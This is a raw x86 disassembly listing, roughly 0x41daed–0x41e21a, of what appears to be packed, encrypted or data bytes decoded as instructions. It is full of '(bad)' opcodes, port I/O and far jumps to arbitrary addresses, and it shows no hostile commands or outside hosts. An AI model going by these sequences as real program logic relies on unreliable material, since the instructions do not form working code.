  41daed:	add    dh,BYTE PTR [edi]
  41daef:	mov    dl,0xd2
  41daf1:	adc    BYTE PTR [ebp+0x17],bh
  41daf4:	clc    
  41daf5:	test   al,0x3c
  41daf7:	pop    eax
  41daf8:	dec    eax
  41daf9:	(bad)  
  41dafa:	imul   ecx
  41dafc:	jno    0x41db4d
  41dafe:	xchg   ebx,eax
  41daff:	xor    DWORD PTR [edx],esp
  41db01:	mov    es,WORD PTR [edi+ebx*4]
  41db04:	and    dh,BYTE PTR [eax+ebp*2+0x40]
  41db08:	out    dx,eax
  41db09:	sub    edx,DWORD PTR [ebx-0x5e690fcb]
  41db0f:	mov    cl,0x85
  41db11:	mov    ds:0x97558746,al
  41db16:	mov    ds:0x89853b07,al
  41db1b:	cmp    ch,dl
  41db1d:	gs push ebp
  41db1f:	inc    ebx
  41db20:	jmp    0x119a:0xb17e19c8
  41db27:	jns    0x41db8d
  41db29:	es ds ins BYTE PTR es:[edi],dx
  41db2c:	or     bh,BYTE PTR [esi]
  41db2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db2f:	fst    DWORD PTR [edi+0x3f]
  41db32:	test   eax,0xd817dff8
  41db37:	outs   dx,BYTE PTR ds:[esi]
  41db38:	inc    ebx
  41db39:	xchg   ecx,eax
  41db3a:	sti    
  41db3b:	or     BYTE PTR [ebx+0x55b60517],bl
  41db41:	jb     0x41dae8
  41db43:	add    al,0x89
  41db45:	push   edi
  41db46:	inc    edi
  41db47:	popf   
  41db48:	push   esp
  41db49:	in     eax,dx
  41db4a:	pop    edi
  41db4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db4c:	sbb    al,0x3a
  41db4e:	out    dx,eax
  41db4f:	les    esi,FWORD PTR [edi+0x3d80e911]
  41db55:	xor    DWORD PTR [ebp+0x19],ebx
  41db58:	jg     0x41db73
  41db5a:	(bad)  
  41db5b:	mov    dl,0x13
  41db5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db5e:	add    dl,al
  41db60:	(bad)  
  41db61:	or     cl,BYTE PTR [ebx-0x44]
  41db64:	inc    ecx
	...
  41db71:	inc    ecx
  41db72:	out    dx,eax
  41db73:	jnp    0x41dba3
  41db75:	(bad)  
  41db76:	mov    esi,0x1adaef55
  41db7b:	cmp    eax,0x3bf6ba62
  41db80:	retf   0x5725
  41db83:	add    DWORD PTR [eax],eax
  41db85:	lods   al,BYTE PTR ds:[esi]
  41db86:	add    eax,DWORD PTR [eax]
  41db88:	add    BYTE PTR [eax-0x2eada0a9],bh
  41db8e:	cld    
  41db8f:	stos   DWORD PTR es:[edi],eax
  41db90:	stos   BYTE PTR es:[edi],al
  41db91:	push   cs
  41db92:	pop    eax
  41db93:	loope  0x41db64
  41db95:	enter  0x851e,0xe4
  41db99:	out    0x77,al
  41db9b:	loopne 0x41dbf0
  41db9d:	pop    esp
  41db9e:	stos   DWORD PTR es:[edi],eax
  41db9f:	ins    BYTE PTR es:[edi],dx
  41dba0:	pop    edi
  41dba1:	pop    esp
  41dba2:	push   ebp
  41dba3:	in     al,dx
  41dba4:	adc    al,0x47
  41dba6:	mul    BYTE PTR [ebx-0x4]
  41dba9:	(bad)  [ebx+0x3b]
  41dbac:	loop   0x41dbc0
  41dbae:	data16 adc al,0x36
  41dbb1:	lock sub eax,0x3f81578b
  41dbb7:	test   eax,0x187f62bc
  41dbbc:	je     0x41dbe2
  41dbbe:	(bad)  
  41dbbf:	sbb    BYTE PTR [ecx+0x28],bh
  41dbc2:	sub    ebp,ebp
  41dbc4:	mov    bh,0xbe
  41dbc6:	adc    al,0xc6
  41dbc8:	xlat   BYTE PTR ds:[ebx]
  41dbc9:	daa    
  41dbca:	adc    eax,0x2d9ff49f
  41dbcf:	sti    
  41dbd0:	scas   al,BYTE PTR es:[edi]
  41dbd1:	retf   
  41dbd2:	or     al,0x57
  41dbd4:	push   ss
  41dbd5:	push   0xe0ee1a26
  41dbda:	aas    
  41dbdb:	adc    esp,DWORD PTR [ecx-0x25f41055]
  41dbe1:	retf   
  41dbe2:	xchg   esp,eax
  41dbe3:	pop    ebp
  41dbe4:	sub    edx,ebp
  41dbe6:	xchg   ebp,eax
  41dbe7:	push   esi
  41dbe8:	xor    al,0xe1
  41dbea:	out    0x78,eax
  41dbec:	jle    0x41dbb5
  41dbee:	mov    esp,0x5d6e719
  41dbf3:	jg     0x41dc25
  41dbf5:	in     eax,dx
  41dbf6:	jle    0x41dc38
  41dbf8:	test   dh,bh
  41dbfa:	(bad)  
  41dbfb:	rcr    BYTE PTR [edx-0x7d08db40],cl
  41dc01:	xchg   edx,eax
  41dc02:	mov    edx,0x54866477
  41dc07:	mov    edx,0x155f27ed
  41dc0c:	adc    dl,BYTE PTR [edi-0x786a0df8]
  41dc12:	add    eax,0x293a721
  41dc17:	popf   
  41dc18:	or     eax,0xe8501656
  41dc1d:	(bad)  
  41dc1e:	scas   eax,DWORD PTR es:[edi]
  41dc1f:	in     al,dx
  41dc20:	popf   
  41dc21:	push   es
  41dc22:	sub    eax,0xee72374b
  41dc27:	ja     0x41dc02
  41dc29:	jl     0x41dc69
  41dc2b:	test   BYTE PTR [ecx+0x71],bh
  41dc2e:	sbb    DWORD PTR [edx-0x60083027],ebx
  41dc34:	push   edx
  41dc35:	mov    cl,0x61
  41dc37:	inc    ecx
  41dc38:	es xor DWORD PTR fs:[ebp-0x30d38ad0],ebp
  41dc40:	adc    eax,0x779fda78
  41dc45:	aam    0x68
  41dc47:	push   ds
  41dc48:	fist   WORD PTR [ecx]
  41dc4a:	mul    bl
  41dc4c:	mov    al,ds:0xd960b00b
  41dc51:	xor    BYTE PTR [ecx+0x74],ch
  41dc54:	inc    ebp
  41dc55:	shl    DWORD PTR [ecx+ebx*1],0x7b
  41dc59:	std    
  41dc5a:	fst    DWORD PTR [edi+0x1e]
  41dc5d:	sub    eax,DWORD PTR [ebx]
  41dc5f:	xor    bl,BYTE PTR [esi+0x76d8a159]
  41dc65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc66:	xchg   BYTE PTR [ecx+eiz*1+0x1828cf43],dl
  41dc6d:	jle    0x41dc35
  41dc6f:	ins    BYTE PTR es:[edi],dx
  41dc70:	fcmove st,st(6)
  41dc72:	jae    0x41dc26
  41dc74:	aas    
  41dc75:	out    dx,eax
  41dc76:	mov    ebx,0x6e734569
  41dc7b:	mov    ebp,0xe54bf477
  41dc80:	push   esi
  41dc81:	jp     0x41dc96
  41dc83:	xchg   edx,eax
  41dc84:	jle    0x41dc87
  41dc86:	xor    DWORD PTR [esi],0x398bcda6
  41dc8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc8d:	fidivr WORD PTR [ecx+0x3c2ce368]
  41dc93:	pop    ds
  41dc94:	int    0xbc
  41dc96:	idiv   BYTE PTR [eax]
  41dc98:	repz sub BYTE PTR [eax+0x2b1e63a2],dl
  41dc9f:	adc    BYTE PTR [edx],bl
  41dca1:	cmp    ch,dh
  41dca3:	ret    0x887e
  41dca6:	xor    al,0x84
  41dca8:	stos   DWORD PTR es:[edi],eax
  41dca9:	jbe    0x41dc84
  41dcab:	push   edi
  41dcac:	cli    
  41dcad:	cmp    bl,ah
  41dcaf:	aad    0xf7
  41dcb1:	imul   esi,DWORD PTR [edx+0x94458e6],0x40817520
  41dcbb:	sahf   
  41dcbc:	cwde   
  41dcbd:	xchg   esp,eax
  41dcbe:	push   ecx
  41dcbf:	rol    BYTE PTR [edx],0xf4
  41dcc2:	stc    
  41dcc3:	js     0x41dcbc
  41dcc5:	xor    ebp,esi
  41dcc7:	mov    ah,0x15
  41dcc9:	pop    ebp
  41dcca:	push   esi
  41dccb:	sbb    DWORD PTR [edi-0x5c],esp
  41dcce:	scas   al,BYTE PTR es:[edi]
  41dccf:	adc    BYTE PTR [ecx*4-0x1f6e0f08],bh
  41dcd6:	aaa    
  41dcd7:	in     eax,dx
  41dcd8:	call   0x91d:0xe420591c
  41dcdf:	add    DWORD PTR [edx],edi
  41dce1:	int3   
  41dce2:	sar    DWORD PTR [eax],1
  41dce4:	ror    DWORD PTR [eax],0x1e
  41dce7:	inc    ebx
  41dce8:	retf   0x64f1
  41dceb:	jns    0x41dcef
  41dced:	push   ecx
  41dcee:	xchg   esp,eax
  41dcef:	xchg   ebx,eax
  41dcf0:	mov    BYTE PTR [edi],ah
  41dcf2:	inc    ecx
  41dcf3:	loope  0x41dca9
  41dcf5:	je     0x41dc98
  41dcf7:	mov    DWORD PTR [esi+0x6975f4cd],esp
  41dcfd:	iret   
  41dcfe:	ret    
  41dcff:	rcl    edx,cl
  41dd01:	in     eax,dx
  41dd02:	and    dh,BYTE PTR [eax+0x7f]
  41dd05:	pop    edx
  41dd06:	ret    
  41dd07:	in     al,0x21
  41dd09:	dec    ebx
  41dd0a:	imul   ebp,DWORD PTR [ecx+0x29],0xfffffff9
  41dd0e:	or     edi,DWORD PTR [edx+0x50b145e2]
  41dd14:	sti    
  41dd15:	movlps QWORD PTR [ebx-0x33],xmm6
  41dd19:	xchg   dh,ch
  41dd1b:	jl     0x41dd55
  41dd1d:	in     eax,0xd4
  41dd1f:	in     eax,0x9
  41dd21:	inc    eax
  41dd22:	nop
  41dd23:	inc    eax
  41dd24:	loop   0x41dcc3
  41dd26:	cdq    
  41dd27:	inc    esi
  41dd28:	sbb    al,0x3f
  41dd2a:	xor    ch,BYTE PTR [eax]
  41dd2c:	mov    al,ds:0x6c36cbdf
  41dd31:	push   0x4a
  41dd33:	or     ecx,DWORD PTR [ecx+esi*2+0x67679341]
  41dd3a:	es push cs
  41dd3c:	inc    eax
  41dd3d:	aas    
  41dd3e:	and    DWORD PTR [edx],edx
  41dd40:	fdivr  QWORD PTR [edx-0x51787ce9]
  41dd46:	xchg   edx,eax
  41dd47:	inc    edx
  41dd48:	pop    esp
  41dd49:	pop    es
  41dd4a:	dec    ecx
  41dd4b:	(bad)  
  41dd4c:	mul    DWORD PTR [ebx-0x7c]
  41dd4f:	sub    al,0x25
  41dd51:	in     eax,dx
  41dd52:	leave  
  41dd53:	sub    ebp,DWORD PTR [ecx]
  41dd55:	shl    BYTE PTR [ebp+0x41923c57],cl
  41dd5b:	xor    eax,DWORD PTR [eax]
  41dd5d:	push   ecx
  41dd5e:	pop    es
  41dd5f:	sar    DWORD PTR [edx-0x7e7fce46],0x22
  41dd66:	aas    
  41dd67:	mov    edi,0xbcad9b35
  41dd6c:	push   0xfffffff7
  41dd6e:	xchg   ecx,eax
  41dd6f:	jo     0x41dd84
  41dd71:	dec    DWORD PTR [esi-0x52]
  41dd74:	test   eax,0xa2580082
  41dd79:	inc    ebx
  41dd7a:	ins    BYTE PTR es:[edi],dx
  41dd7b:	cmp    al,0x81
  41dd7d:	mov    ebx,0x50003b90
  41dd82:	mov    dh,0x6a
  41dd84:	rol    BYTE PTR ds:[eax+0x4],0xd0
  41dd89:	ret    0x85fb
  41dd8c:	and    dl,BYTE PTR [edi+0x5f]
  41dd8f:	pop    esi
  41dd90:	sub    dh,dh
  41dd92:	jecxz  0x41dd64
  41dd94:	inc    ecx
  41dd95:	pop    eax
  41dd96:	jmp    0x6847:0x44a869b7
  41dd9d:	mov    ds:0xf9e0bc9c,eax
  41dda2:	and    al,0xd2
  41dda4:	addr16 data16 mov bh,0x46
  41dda8:	outs   dx,BYTE PTR ds:[esi]
  41dda9:	rcl    DWORD PTR [esi+0x65],cl
  41ddac:	sbb    al,0x9a
  41ddae:	stos   BYTE PTR es:[edi],al
  41ddaf:	ret    
  41ddb0:	jb     0x41dd75
  41ddb2:	je     0x41ddee
  41ddb4:	out    0x5f,al
  41ddb6:	fistp  DWORD PTR [eax+ebp*2-0x3b]
  41ddba:	cmp    esi,DWORD PTR [edx+0x32]
  41ddbd:	in     eax,0x2d
  41ddbf:	stc    
  41ddc0:	pushf  
  41ddc1:	cmp    al,BYTE PTR [edx]
  41ddc3:	jnp    0x41dd6b
  41ddc5:	jg     0x41ddc0
  41ddc7:	cmc    
  41ddc8:	inc    ebx
  41ddc9:	sbb    DWORD PTR [ebx],0xb33ec0dd
  41ddcf:	sub    al,0x6c
  41ddd1:	fcom   DWORD PTR [esi]
  41ddd3:	cmp    cl,BYTE PTR [eax]
  41ddd5:	mov    WORD PTR [edi],fs
  41ddd7:	retf   
  41ddd8:	xchg   esi,eax
  41ddd9:	test   al,0x1d
  41dddb:	xchg   BYTE PTR [esi+0x18],bl
  41ddde:	call   DWORD PTR [bp+di]
  41dde1:	or     eax,0x9547fe71
  41dde6:	rcr    BYTE PTR [ebp-0x62],0xb9
  41ddea:	lock mov bh,0x88
  41dded:	pop    ecx
  41ddee:	pusha  
  41ddef:	popf   
  41ddf0:	pop    esi
  41ddf1:	aas    
  41ddf2:	and    DWORD PTR [edx-0x7935b96b],0xc5f5b280
  41ddfc:	lock adc BYTE PTR [ebx+0x58],al
  41de00:	pop    eax
  41de01:	sbb    eax,0x96e2ce3e
  41de06:	push   esi
  41de07:	(bad)  
  41de08:	stc    
  41de09:	add    ch,BYTE PTR [edx-0x7c]
  41de0c:	dec    ebp
  41de0d:	leave  
  41de0e:	push   ebp
  41de0f:	ds xchg esi,eax
  41de11:	pop    ss
  41de12:	nop
  41de13:	(bad)  
  41de15:	arpl   WORD PTR [edi-0x61],bp
  41de18:	add    ebx,ebp
  41de1a:	pop    es
  41de1b:	call   DWORD PTR [edi+ebx*2-0x4f]
  41de1f:	sub    al,0x6f
  41de21:	rcr    BYTE PTR [eax],cl
  41de23:	mov    ch,0x7e
  41de25:	int    0xc
  41de27:	dec    esi
  41de28:	sahf   
  41de29:	sub    edi,esi
  41de2b:	cmp    eax,0xfcb6ea9b
  41de30:	dec    edx
  41de31:	hlt    
  41de32:	ins    DWORD PTR es:[edi],dx
  41de33:	xchg   esp,eax
  41de34:	or     DWORD PTR [esi-0x25a543e3],esp
  41de3a:	test   ecx,eax
  41de3c:	sub    ebx,DWORD PTR ds:0x5b4806c5
  41de42:	sbb    cl,BYTE PTR [ecx+esi*8+0x38]
  41de46:	test   DWORD PTR [ebx+0x57],edi
  41de49:	xor    al,BYTE PTR [edx]
  41de4b:	pop    es
  41de4c:	push   0xd6899599
  41de51:	jg     0x41de9c
  41de53:	popf   
  41de54:	test   BYTE PTR [ebx*1+0x172a2e77],dh
  41de5b:	jl     0x41deb0
  41de5d:	adc    ecx,DWORD PTR [esp+esi*8-0x701c19da]
  41de64:	mov    ebp,0x9810d3da
  41de69:	sub    bh,BYTE PTR [edi-0x9]
  41de6c:	imul   esp,eax,0xd1f8f9e3
  41de72:	xchg   ebp,eax
  41de73:	pushf  
  41de74:	test   DWORD PTR [eax],eax
  41de76:	cmp    ebx,ebx
  41de78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de79:	loopne 0x41de2b
  41de7b:	out    0xf1,eax
  41de7d:	lea    ebp,[esi+ebp*8-0xc]
  41de81:	and    BYTE PTR [edx],bh
  41de83:	into   
  41de84:	cmp    al,0x7b
  41de86:	pop    es
  41de87:	mov    BYTE PTR [edi-0x2ded8f0],dh
  41de8d:	pop    bp
  41de8f:	fild   WORD PTR [ebp+edi*4-0x6]
  41de93:	repz sub bh,BYTE PTR ss:[esi-0x64]
  41de98:	xchg   BYTE PTR [ecx],dl
  41de9a:	cvtpi2ps xmm1,QWORD PTR [eax]
  41de9d:	push   0xc2832c46
  41dea2:	mov    cs,edx
  41dea4:	outs   dx,BYTE PTR ds:[esi]
  41dea5:	mov    eax,ds:0xf587b9d7
  41deaa:	pop    es
  41deab:	cmp    ecx,DWORD PTR [edi]
  41dead:	jle    0x41deb0
  41deaf:	shl    cl,1
  41deb1:	ret    
  41deb2:	fisub  DWORD PTR [edi-0x23174628]
  41deb8:	ins    BYTE PTR es:[edi],dx
  41deb9:	dec    eax
  41deba:	push   ds
  41debb:	mov    ch,0xf7
  41debd:	jg     0x41df0e
  41debf:	mov    edi,0x3b1ad00
  41dec4:	sbb    DWORD PTR [eax],0x6c
  41dec7:	and    al,0x1
  41dec9:	xor    DWORD PTR [ecx-0x21],eax
  41decc:	aas    
  41decd:	sbb    DWORD PTR [ebx],eax
  41decf:	add    esi,DWORD PTR [edi]
  41ded1:	push   ss
  41ded2:	push   ds
  41ded3:	mov    DWORD PTR [edi-0x6df1c6ef],edx
  41ded9:	dec    cx
  41dedb:	popf   
  41dedc:	or     eax,0xd58aea51
  41dee1:	leave  
  41dee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dee3:	mov    ss,WORD PTR [eax-0x31]
  41dee6:	popa   
  41dee7:	jle    0x41deb4
  41dee9:	or     ebp,DWORD PTR [edx+0xf]
  41deec:	jmp    0xe79fb8b4
  41def1:	sbb    bl,BYTE PTR [eax-0x19]
  41def4:	dec    ebx
  41def5:	int3   
  41def6:	ds and eax,0x1b84312f
  41defc:	dec    ebx
  41defd:	dec    ebx
  41defe:	jle    0x41def9
  41df00:	lahf   
  41df01:	push   eax
  41df02:	cwde   
  41df03:	inc    edx
  41df04:	dec    edx
  41df05:	cli    
  41df06:	cld    
  41df07:	addr16 sub ch,dl
  41df0a:	sbb    BYTE PTR [ebx],dh
  41df0c:	or     ah,BYTE PTR [ecx]
  41df0e:	xchg   esp,eax
  41df0f:	add    ebx,DWORD PTR [ebx]
  41df11:	push   0xffffffef
  41df13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df14:	inc    ebp
  41df15:	push   ecx
  41df16:	fadd   DWORD PTR [ebp+0x3e7ed12a]
  41df1c:	jno    0x41df8a
  41df1e:	push   es
  41df1f:	loopne 0x41deeb
  41df21:	retf   
  41df22:	rcl    DWORD PTR [ebx],1
  41df24:	adc    ch,BYTE PTR [ecx+0x9]
  41df27:	test   BYTE PTR [eax-0x80],bl
  41df2a:	ins    BYTE PTR es:[edi],dx
  41df2b:	adc    al,0x83
  41df2d:	push   ds
  41df2e:	mov    ecx,0xb469f2e4
  41df33:	cwde   
  41df34:	lahf   
	...
  41df41:	adc    eax,0x7f7d7f79
  41df46:	jg     0x41df5f
  41df48:	jns    0x41df1b
  41df4a:	pop    cx
  41df4c:	sbb    BYTE PTR [ebx],0x37
  41df4f:	into   
  41df50:	adc    ecx,edx
  41df52:	pop    edx
  41df53:	add    DWORD PTR [eax],eax
  41df55:	lods   al,BYTE PTR ds:[esi]
  41df56:	add    eax,DWORD PTR [eax]
  41df58:	add    ch,al
  41df5a:	test   DWORD PTR [ecx],eax
  41df5c:	inc    ecx
  41df5d:	stos   DWORD PTR es:[edi],eax
  41df5e:	cmp    bh,BYTE PTR [ebx+esi*2]
  41df61:	mov    bh,0x7c
  41df63:	pop    ss
  41df64:	add    eax,DWORD PTR [edi]
  41df66:	fsub   st(6),st
  41df68:	cmp    esp,DWORD PTR [eax]
  41df6a:	(bad)  
  41df6b:	fxch   st(1)
  41df6d:	paddusw mm4,mm7
  41df70:	in     al,dx
  41df71:	(bad)  
  41df72:	repnz ss inc ecx
  41df75:	mov    ah,0x6e
  41df77:	inc    eax
  41df78:	adc    DWORD PTR [esi-0x5c96436],edx
  41df7e:	jb     0x41df12
  41df80:	das    
  41df81:	into   
  41df82:	in     al,dx
  41df83:	int3   
  41df84:	sbb    eax,0x393f1743
  41df89:	lods   eax,DWORD PTR ds:[esi]
  41df8a:	add    BYTE PTR [eax+0x65],al
  41df8d:	in     eax,0x75
  41df8f:	(bad)  
  41df90:	sti    
  41df91:	arpl   ax,sp
  41df93:	jmp    0x41df2a
  41df95:	rol    DWORD PTR [edi+0x59],1
  41df98:	jp     0x41dfc1
  41df9a:	dec    edi
  41df9b:	popf   
  41df9c:	icebp  
  41df9d:	ins    DWORD PTR es:[edi],dx
  41df9e:	repz retf 0x7601
  41dfa2:	add    esi,edi
  41dfa4:	xchg   ecx,edi
  41dfa6:	adc    bl,BYTE PTR [eax]
  41dfa8:	push   ecx
  41dfa9:	sub    bh,BYTE PTR [ebx-0x5ab47aeb]
  41dfaf:	mov    esp,0x7aa28884
  41dfb4:	nop
  41dfb5:	ds (bad) 
  41dfb7:	popa   
  41dfb8:	pushf  
  41dfb9:	ins    DWORD PTR es:[edi],dx
  41dfba:	mov    ch,0x66
  41dfbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfbd:	lock mov dl,0xc0
  41dfc0:	cli    
  41dfc1:	mov    dh,bh
  41dfc3:	mov    eax,ds:0xef9aa859
  41dfc8:	jg     0x41df8f
  41dfca:	cmp    BYTE PTR [ecx+eax*2],cl
  41dfcd:	dec    edi
  41dfce:	push   edx
  41dfcf:	les    ecx,FWORD PTR [edx+0x2707b2f7]
  41dfd5:	je     0x41dfa3
  41dfd7:	cmp    al,0xfc
  41dfd9:	dec    edi
  41dfda:	jp     0x41e006
  41dfdc:	mov    bh,0xd4
  41dfde:	inc    edx
  41dfdf:	mov    ecx,0xbce325d3
  41dfe4:	jne    0x41dfe3
  41dfe6:	mov    esp,0x3fdb852e
  41dfeb:	add    DWORD PTR [ebp+0x18],0xffffff8e
  41dfef:	lods   al,BYTE PTR ds:[esi]
  41dff0:	fimul  WORD PTR [edx+0x1eb09a60]
  41dff6:	mov    ebx,0xe85f2951
  41dffb:	lds    esp,FWORD PTR [esi]
  41dffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dffe:	xor    eax,0x42a99054
  41e003:	in     al,0xf2
  41e005:	js     0x41e00a
  41e007:	repz push cs
  41e009:	inc    esi
  41e00a:	cmc    
  41e00b:	cmc    
  41e00c:	mul    al
  41e00e:	call   0xd7b9be08
  41e013:	xor    ah,ch
  41e015:	xor    DWORD PTR [esi-0x49379364],ecx
  41e01b:	mov    bl,0xc6
  41e01d:	test   BYTE PTR [ecx+esi*4+0x49bd83a6],bl
  41e024:	jmp    0x41e010
  41e026:	xor    DWORD PTR [esi],eax
  41e028:	and    DWORD PTR [edi+esi*4-0x14d3cbb8],ecx
  41e02f:	mov    dl,0x9e
  41e031:	sub    ebp,DWORD PTR [esi]
  41e033:	mov    dh,0xe
  41e035:	inc    esp
  41e036:	or     ch,BYTE PTR [eax-0x5e0bc7f5]
  41e03c:	or     edx,DWORD PTR [eax]
  41e03e:	(bad)  
  41e03f:	fidivr WORD PTR [eax]
  41e041:	mov    eax,0x32992c00
  41e046:	imul   edi,DWORD PTR [edx-0x155f5e1a],0x71
  41e04d:	sbb    al,0xa6
  41e04f:	and    DWORD PTR [ecx+0x4a0f9e0d],eax
  41e055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e056:	xlat   BYTE PTR ds:[ebx]
  41e057:	in     al,dx
  41e058:	sti    
  41e059:	hlt    
  41e05a:	push   ss
  41e05b:	scas   al,BYTE PTR es:[edi]
  41e05c:	(bad)  
  41e05d:	xchg   esi,eax
  41e05e:	lea    eax,[esi+0x18]
  41e061:	out    dx,eax
  41e062:	mov    bh,0x6
  41e064:	add    ah,BYTE PTR [ecx+0x53]
  41e067:	inc    ecx
  41e068:	push   0xfeeb347f
  41e06d:	inc    ebx
  41e06e:	stos   DWORD PTR es:[edi],eax
  41e06f:	inc    esi
  41e070:	idiv   cl
  41e072:	adc    al,0x48
  41e074:	sti    
  41e075:	dec    ebp
  41e076:	lock dec edi
  41e078:	fs out dx,eax
  41e07a:	subps  xmm1,XMMWORD PTR [edi+0x3b]
  41e07e:	sub    eax,0xc511a0
  41e083:	xchg   edx,eax
  41e084:	push   0xffffff8f
  41e086:	xchg   ecx,eax
  41e087:	mov    edx,0xaec9cfed
  41e08c:	jo     0x41e017
  41e08e:	fwait
  41e08f:	sti    
  41e090:	mov    ch,0x2f
  41e092:	outs   dx,BYTE PTR ds:[esi]
  41e093:	lock (bad) 
  41e095:	pop    edi
  41e096:	sub    DWORD PTR [ebp+0x56],eax
  41e099:	inc    esi
  41e09a:	dec    edx
  41e09b:	fsub   st,st(4)
  41e09d:	out    dx,eax
  41e09e:	pusha  
  41e09f:	imul   ebx,DWORD PTR [ecx],0xffffffee
  41e0a2:	imul   DWORD PTR [ecx+0x2664d295]
  41e0a8:	mov    cl,0xe5
  41e0aa:	shl    BYTE PTR [edx+0x58648860],0x65
  41e0b1:	mov    esp,0x63c7db2c
  41e0b6:	into   
  41e0b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0b8:	loope  0x41e092
  41e0ba:	cli    
  41e0bb:	(bad)  
  41e0bc:	cli    
  41e0bd:	xor    eax,0x5d5db478
  41e0c2:	dec    eax
  41e0c3:	mov    dh,0xf3
  41e0c5:	loop   0x41e104
  41e0c7:	mov    ecx,DWORD PTR [eax+0x5e17ca0b]
  41e0cd:	mov    ah,0x5d
  41e0cf:	xchg   esp,eax
  41e0d0:	pop    ds
  41e0d1:	sub    eax,0x41e1bd90
  41e0d6:	rcr    DWORD PTR [esi],0xdf
  41e0d9:	test   BYTE PTR [ecx-0x3244774],ah
  41e0df:	fist   WORD PTR [ebp-0x45]
  41e0e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0e3:	nop
  41e0e4:	scas   al,BYTE PTR es:[edi]
  41e0e5:	cmp    DWORD PTR [ebp+0x26a2d065],esi
  41e0eb:	call   0xc8c79360
  41e0f0:	dec    ch
  41e0f2:	adc    BYTE PTR [esi+eax*8],dl
  41e0f5:	shr    ecx,cl
  41e0f7:	std    
  41e0f8:	loop   0x41e0ee
  41e0fa:	cli    
  41e0fb:	xor    edx,esp
  41e0fd:	mov    dl,0xf8
  41e0ff:	or     eax,0xbedcd7ed
  41e104:	xlat   BYTE PTR ds:[ebx]
  41e105:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e106:	push   ebx
  41e107:	push   ss
  41e108:	pop    esp
  41e109:	jmp    0x607:0xf1f47f21
  41e110:	imul   esp,DWORD PTR [ebp+edx*2-0x2f],0xf02d1b5f
  41e118:	je     0x41e0e2
  41e11a:	dec    esi
  41e11b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e11c:	inc    ecx
  41e11d:	or     esp,DWORD PTR [edi]
  41e11f:	pop    edx
  41e120:	sbb    edi,0x68664ee2
  41e126:	xchg   esi,eax
  41e127:	and    BYTE PTR [esi],dh
  41e129:	pop    esi
  41e12a:	imul   ebp,DWORD PTR [ebx],0xfffffff1
  41e12d:	popa   
  41e12e:	shr    BYTE PTR [edx],1
  41e130:	and    al,0x75
  41e132:	call   0x8961:0xe84032c0
  41e139:	aam    0x34
  41e13b:	mov    ds:0x55b8d1f0,eax
  41e140:	lods   al,BYTE PTR ds:[esi]
  41e141:	test   al,0x7e
  41e143:	in     al,dx
  41e144:	(bad)  
  41e145:	and    BYTE PTR [eax-0x71],cl
  41e148:	jmp    0xfb64:0x7936ee9f
  41e14f:	jp     0x41e0ed
  41e151:	dec    ebp
  41e152:	inc    ebx
  41e153:	call   0xa0c5:0xb0503c01
  41e15a:	(bad)  
  41e15c:	inc    ebx
  41e15d:	stos   BYTE PTR es:[edi],al
  41e15e:	(bad)  
  41e15f:	jge    0x41e165
  41e161:	pop    ds
  41e162:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41e164:	xchg   esp,eax
  41e165:	dec    eax
  41e166:	sub    BYTE PTR [ebp+0x13],0x48
  41e16a:	bound  ebx,QWORD PTR [edi]
  41e16c:	mov    BYTE PTR [ecx+edx*4+0x3d7d1731],0x7a
  41e174:	les    eax,FWORD PTR [esi]
  41e176:	fist   WORD PTR [ebp+0xb]
  41e179:	mov    ch,0x60
  41e17b:	ds popa 
  41e17d:	xchg   esi,eax
  41e17e:	and    DWORD PTR [edi],edi
  41e180:	mov    edi,0xcbd0206a
  41e185:	aad    0xe1
  41e187:	aaa    
  41e188:	loope  0x41e17b
  41e18a:	mov    bl,0xa5
  41e18c:	pop    esp
  41e18d:	mov    ds:0x918e9c59,al
  41e192:	je     0x41e152
  41e194:	mov    ebx,0xaa99a442
  41e199:	sub    eax,0x421b4b85
  41e19e:	fs push es
  41e1a0:	and    DWORD PTR [ebx-0x65ac63bb],0x81954f9f
  41e1aa:	fstp   TBYTE PTR [ebp+0x73]
  41e1ad:	jg     0x41e21f
  41e1af:	sub    al,0x15
  41e1b1:	jno    0x41e1d3
  41e1b3:	jbe    0x58248319
  41e1b9:	icebp  
  41e1ba:	inc    edi
  41e1bb:	pop    edi
  41e1bc:	imul   ebp,DWORD PTR [eax+eax*1],0x227ef35b
  41e1c3:	leave  
  41e1c4:	cmp    eax,0x1490b8b
  41e1c9:	retf   0x35c7
  41e1cc:	loop   0x41e155
  41e1ce:	and    al,0x9d
  41e1d0:	pop    ss
  41e1d1:	into   
  41e1d2:	nop
  41e1d3:	ret    
  41e1d4:	xlat   BYTE PTR ds:[ebx]
  41e1d5:	add    ebp,edx
  41e1d7:	jmp    0xe4362a8
  41e1dc:	out    dx,eax
  41e1dd:	shr    DWORD PTR [esi],cl
  41e1df:	call   DWORD PTR [esi+eax*8-0x1ac1ce60]
  41e1e6:	xor    eax,0xffb91558
  41e1eb:	mov    edx,0x9768ae1b
  41e1f0:	jmp    0xa2f0d8bd
  41e1f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1f6:	cmp    edi,0x69
  41e1f9:	mov    edx,0xe6a84102
  41e1fe:	fstp   QWORD PTR [edx-0x5c8fa42b]
  41e204:	lds    edx,FWORD PTR [eax]
  41e206:	(bad)  
  41e207:	loope  0x41e1ac
  41e209:	jb     0x41e249
  41e20b:	jle    0x41e26b
  41e20d:	(bad)  
  41e20e:	mov    dh,0x96
  41e210:	xchg   ebp,eax
  41e211:	fsub   QWORD PTR [ebx]
  41e213:	mov    ds:0x37048b10,eax
  41e218:	jne    0x41e1ff
  41e21a:	out    0x8f,al
